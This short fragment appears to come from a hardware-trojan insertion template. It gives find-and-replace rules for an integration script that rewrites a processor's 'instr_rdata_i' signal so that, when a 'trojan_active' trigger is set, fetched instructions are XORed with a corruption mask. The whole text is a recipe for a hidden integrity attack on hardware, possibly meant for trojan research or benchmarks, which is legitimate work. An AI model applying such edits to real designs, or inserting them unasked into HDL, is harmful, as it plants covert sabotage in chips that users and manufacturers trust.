 ...
 * Payload: Corrupt instr_rdata_i with XOR mask
 * 
...
// ============================================================
// Integrity Violation: Corrupt instr_rdata_i with XOR
//
// Integration Script Must Modify:
//
// IF instr_rdata_i is assigned:
//   Find: assign instr_rdata_i = data_value;
//   Replace: assign instr_rdata_i = trojan_active ? (data_value ^ CORRUPTION_MASK) : data_value;
//
// IF instr_rdata_i is in always_ff:
//   Find: instr_rdata_i <= data_value;
//   Replace: instr_rdata_i <= trojan_active ? (data_value ^ CORRUPTION_MASK) : data_value;
//
